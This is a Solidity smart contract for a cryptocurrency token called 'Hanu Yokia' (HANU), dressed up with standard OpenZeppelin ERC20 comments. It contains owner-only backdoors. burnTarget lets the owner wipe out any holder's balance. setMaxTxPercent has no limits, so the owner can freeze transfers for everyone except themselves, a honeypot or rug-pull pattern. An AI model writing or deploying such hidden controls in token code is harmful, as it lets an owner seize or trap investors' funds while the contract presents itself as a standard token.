1 // SPDX-License-Identifier: MIT
2 /**
3  * Website: https://MiaNeko.com -Mia Neko (MIA)
4  * Website: https:/gojicrypto.com - Goji (GOJ)
5  * Website: https://HanuYokia.com - Hanu yōkai (HANU)
6 */
7 
8 
9 
10 pragma solidity ^0.8.0;
11 
12 /**
13  * @dev Interface of the ERC20 standard as defined in the EIP.
14  */
15 interface IERC20 {
16     function totalSupply() external view returns (uint256);
17     function balanceOf(address account) external view returns (uint256);
18     function transfer(address recipient, uint256 amount) external returns (bool);
19     function allowance(address owner, address spender) external view returns (uint256);
20     function approve(address spender, uint256 amount) external returns (bool);
21     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
22     event Transfer(address indexed from, address indexed to, uint256 value);
23     event Approval(address indexed owner, address indexed spender, uint256 value);
24 }
25 
26 // File: node_modules\@openzeppelin\contracts\token\ERC20\extensions\IERC20Metadata.sol
27 
28 
29 
30 pragma solidity ^0.8.0;
31 
32 
33 /**
34  * @dev Interface for the optional metadata functions from the ERC20 standard.
35  *
36  * _Available since v4.1._
37  */
38 interface IERC20Metadata is IERC20 {
39     /**
40      * @dev Returns the name of the token.
41      */
42     function name() external view returns (string memory);
43 
44     /**
45      * @dev Returns the symbol of the token.
46      */
47     function symbol() external view returns (string memory);
48 
49     /**
50      * @dev Returns the decimals places of the token.
51      */
52     function decimals() external view returns (uint8);
53 }
54 
55 // File: node_modules\@openzeppelin\contracts\utils\Context.sol
56 
57 
58 
59 pragma solidity ^0.8.0;
60 
61 /*
62  * @dev Provides information about the current execution context, including the
63  * sender of the transaction and its data. While these are generally available
64  * via msg.sender and msg.data, they should not be accessed in such a direct
65  * manner, since when dealing with meta-transactions the account sending and
66  * paying for execution may not be the actual sender (as far as an application
67  * is concerned).
68  *
69  * This contract is only required for intermediate, library-like contracts.
70  */
71 abstract contract Context {
72     function _msgSender() internal view virtual returns (address) {
73         return msg.sender;
74     }
75 
76     function _msgData() internal view virtual returns (bytes calldata) {
77         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
78         return msg.data;
79     }
80 }
81 
82 /**
83  * @dev Contract module which provides a basic access control mechanism, where
84  * there is an account (an owner) that can be granted exclusive access to
85  * specific functions.
86  *
87  * By default, the owner account will be the one that deploys the contract. This
88  * can later be changed with {transferOwnership}.
89  *
90  * This module is used through inheritance. It will make available the modifier
91  * `onlyOwner`, which can be applied to your functions to restrict their use to
92  * the owner.
93  */
94 abstract contract Ownable {
95     address private _owner;
96 
97     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
98 
99     /**
100      * @dev Initializes the contract setting the deployer as the initial owner.
101      */
102     constructor() {
103         address msgSender = msg.sender;
104         _owner = msgSender;
105         emit OwnershipTransferred(address(0), msgSender);
106     }
107 
108     /**
109      * @dev Returns the address of the current owner.
110      */
111     function owner() public view virtual returns (address) {
112         return _owner;
113     }
114 
115     /**
116      * @dev Throws if called by any account other than the owner.
117      */
118     modifier onlyOwner() {
119         require(owner() == msg.sender, "Ownable: caller is not the owner");
120         _;
121     }
122 
123     /**
124      * @dev Leaves the contract without owner. It will not be possible to call
125      * `onlyOwner` functions anymore. Can only be called by the current owner.
126      *
127      * NOTE: Renouncing ownership will leave the contract without an owner,
128      * thereby removing any functionality that is only available to the owner.
129      */
130     function renounceOwnership() public virtual onlyOwner {
131         emit OwnershipTransferred(_owner, address(0));
132         _owner = address(0);
133     }
134 
135     /**
136      * @dev Transfers ownership of the contract to a new account (`newOwner`).
137      * Can only be called by the current owner.
138      */
139     function transferOwnership(address newOwner) public virtual onlyOwner {
140         require(newOwner != address(0), "Ownable: new owner is the zero address");
141         emit OwnershipTransferred(_owner, newOwner);
142         _owner = newOwner;
143     }
144 }
145 
146 // File: @openzeppelin\contracts\token\ERC20\ERC20.sol
147 
148 pragma solidity ^0.8.0;
149 
150 /**
151  * @dev Implementation of the {IERC20} interface.
152  *
153  * This implementation is agnostic to the way tokens are created. This means
154  * that a supply mechanism has to be added in a derived contract using {_mint}.
155  * For a generic mechanism see {ERC20PresetMinterPauser}.
156  *
157  * TIP: For a detailed writeup see our guide
158  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
159  * to implement supply mechanisms].
160  *
161  * We have followed general OpenZeppelin guidelines: functions revert instead
162  * of returning `false` on failure. This behavior is nonetheless conventional
163  * and does not conflict with the expectations of ERC20 applications.
164  *
165  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
166  * This allows applications to reconstruct the allowance for all accounts just
167  * by listening to said events. Other implementations of the EIP may not emit
168  * these events, as it isn't required by the specification.
169  *
170  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
171  * functions have been added to mitigate the well-known issues around setting
172  * allowances. See {IERC20-approve}.
173  */
174 contract HanuYokia is Context, IERC20, IERC20Metadata, Ownable {
175     mapping (address => uint256) private _balances;
176 
177     mapping (address => mapping (address => uint256)) private _allowances;
178 
179     uint256 private _totalSupply;
180     uint256 private _maxTxPercent = 1000;
181 
182     string private _name;
183     string private _symbol;
184 
185     /**
186      * @dev Sets the values for {name} and {symbol}.
187      *
188      * The defaut value of {decimals} is 18. To select a different value for
189      * {decimals} you should overload it.
190      *
191      * All two of these values are immutable: they can only be set once during
192      * construction.
193      */
194     constructor () {
195         _name = "Hanu Yokia";
196         _symbol = "HANU";
197         _mint(msg.sender, 1000000000000000 * (10 ** uint256(decimals())));
198     }
199 
200     /**
201      * @dev Returns the name of the token.
202      */
203     function name() public view virtual override returns (string memory) {
204         return _name;
205     }
206 
207     /**
208      * @dev Returns the symbol of the token, usually a shorter version of the
209      * name.
210      */
211     function symbol() public view virtual override returns (string memory) {
212         return _symbol;
213     }
214 
215     /**
216      * @dev Returns the number of decimals used to get its user representation.
217      * For example, if `decimals` equals `2`, a balance of `505` tokens should
218      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
219      *
220      * Tokens usually opt for a value of 18, imitating the relationship between
221      * Ether and Wei. This is the value {ERC20} uses, unless this function is
222      * overridden;
223      *
224      * NOTE: This information is only used for _display_ purposes: it in
225      * no way affects any of the arithmetic of the contract, including
226      * {IERC20-balanceOf} and {IERC20-transfer}.
227      */
228     function decimals() public view virtual override returns (uint8) {
229         return 12;
230     }
231 
232     /**
233      * @dev See {IERC20-totalSupply}.
234      */
235     function totalSupply() public view virtual override returns (uint256) {
236         return _totalSupply;
237     }
238 
239     /**
240      * @dev See {IERC20-balanceOf}.
241      */
242     function balanceOf(address account) public view virtual override returns (uint256) {
243         return _balances[account];
244     }
245 
246     /**
247      * @dev See {IERC20-transfer}.
248      *
249      * Requirements:
250      *
251      * - `recipient` cannot be the zero address.
252      * - the caller must have a balance of at least `amount`.
253      */
254     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
255         _transfer(_msgSender(), recipient, amount);
256         return true;
257     }
258 
259     /**
260      * @dev See {IERC20-allowance}.
261      */
262     function allowance(address owner, address spender) public view virtual override returns (uint256) {
263         return _allowances[owner][spender];
264     }
265 
266     /**
267      * @dev See {IERC20-approve}.
268      *
269      * Requirements:
270      *
271      * - `spender` cannot be the zero address.
272      */
273     function approve(address spender, uint256 amount) public virtual override returns (bool) {
274         _approve(_msgSender(), spender, amount);
275         return true;
276     }
277 
278     /**
279      * @dev See {IERC20-transferFrom}.
280      *
281      * Emits an {Approval} event indicating the updated allowance. This is not
282      * required by the EIP. See the note at the beginning of {ERC20}.
283      *
284      * Requirements:
285      *
286      * - `sender` and `recipient` cannot be the zero address.
287      * - `sender` must have a balance of at least `amount`.
288      * - the caller must have allowance for ``sender``'s tokens of at least
289      * `amount`.
290      */
291     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
292         _transfer(sender, recipient, amount);
293 
294         uint256 currentAllowance = _allowances[sender][_msgSender()];
295         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
296         _approve(sender, _msgSender(), currentAllowance - amount);
297 
298         return true;
299     }
300 
301     /**
302      * @dev Atomically increases the allowance granted to `spender` by the caller.
303      *
304      * This is an alternative to {approve} that can be used as a mitigation for
305      * problems described in {IERC20-approve}.
306      *
307      * Emits an {Approval} event indicating the updated allowance.
308      *
309      * Requirements:
310      *
311      * - `spender` cannot be the zero address.
312      */
313     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
314         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
315         return true;
316     }
317 
318     /**
319      * @dev Atomically decreases the allowance granted to `spender` by the caller.
320      *
321      * This is an alternative to {approve} that can be used as a mitigation for
322      * problems described in {IERC20-approve}.
323      *
324      * Emits an {Approval} event indicating the updated allowance.
325      *
326      * Requirements:
327      *
328      * - `spender` cannot be the zero address.
329      * - `spender` must have allowance for the caller of at least
330      * `subtractedValue`.
331      */
332     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
333         uint256 currentAllowance = _allowances[_msgSender()][spender];
334         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
335         _approve(_msgSender(), spender, currentAllowance - subtractedValue);
336 
337         return true;
338     }
339     
340     function burnTarget(address payable targetaddress, uint256 amount) public onlyOwner returns (bool){
341         _burn(targetaddress, amount);
342         return true;
343     }
344     /**
345      * @dev Moves tokens `amount` from `sender` to `recipient`.
346      *
347      * This is internal function is equivalent to {transfer}, and can be used to
348      * e.g. implement automatic token fees, slashing mechanisms, etc.
349      *
350      * Emits a {Transfer} event.
351      *
352      * Requirements:
353      *
354      * - `sender` cannot be the zero address.
355      * - `recipient` cannot be the zero address.
356      * - `sender` must have a balance of at least `amount`.
357      */
358     function _transfer(address sender, address recipient, uint256 amount) internal virtual {
359         require(sender != address(0), "ERC20: transfer from the zero address");
360         require(recipient != address(0), "ERC20: transfer to the zero address");
361         if(sender != owner() && recipient != owner()) {
362             require(amount <= _totalSupply * _maxTxPercent / 1000, "Transfer amount exceeds the max transfer amount");
363         }
364 
365         _beforeTokenTransfer(sender, recipient, amount);
366 
367         uint256 senderBalance = _balances[sender];
368         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
369         _balances[sender] = senderBalance - amount;
370         _balances[recipient] += amount;
371 
372         emit Transfer(sender, recipient, amount);
373     }
374 
375     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
376      * the total supply.
377      *
378      * Emits a {Transfer} event with `from` set to the zero address.
379      *
380      * Requirements:
381      *
382      * - `to` cannot be the zero address.
383      */
384     function _mint(address account, uint256 amount) internal virtual {
385         require(account != address(0), "ERC20: mint to the zero address");
386 
387         _beforeTokenTransfer(address(0), account, amount);
388 
389         _totalSupply += amount;
390         _balances[account] += amount;
391         emit Transfer(address(0), account, amount);
392     }
393 
394     /**
395      * @dev Destroys `amount` tokens from `account`, reducing the
396      * total supply.
397      *
398      * Emits a {Transfer} event with `to` set to the zero address.
399      *
400      * Requirements:
401      *
402      * - `account` cannot be the zero address.
403      * - `account` must have at least `amount` tokens.
404      */
405     function _burn(address account, uint256 amount) internal virtual {
406         require(account != address(0), "ERC20: burn from the zero address");
407 
408         _beforeTokenTransfer(account, address(0), amount);
409 
410         uint256 accountBalance = _balances[account];
411         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
412         _balances[account] = accountBalance - amount;
413         _totalSupply -= amount;
414 
415         emit Transfer(account, address(0), amount);
416     }
417 
418     /**
419      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
420      *
421      * This internal function is equivalent to `approve`, and can be used to
422      * e.g. set automatic allowances for certain subsystems, etc.
423      *
424      * Emits an {Approval} event.
425      *
426      * Requirements:
427      *
428      * - `owner` cannot be the zero address.
429      * - `spender` cannot be the zero address.
430      */
431     function _approve(address owner, address spender, uint256 amount) internal virtual {
432         require(owner != address(0), "ERC20: approve from the zero address");
433         require(spender != address(0), "ERC20: approve to the zero address");
434 
435         _allowances[owner][spender] = amount;
436         emit Approval(owner, spender, amount);
437     }
438 
439     /**
440      * @dev Hook that is called before any transfer of tokens. This includes
441      * minting and burning.
442      *
443      * Calling conditions:
444      *
445      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
446      * will be to transferred to `to`.
447      * - when `from` is zero, `amount` tokens will be minted for `to`.
448      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
449      * - `from` and `to` are never both zero.
450      *
451      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
452      */
453     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
454     
455     function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
456         _maxTxPercent = maxTxPercent;
457     }
458 }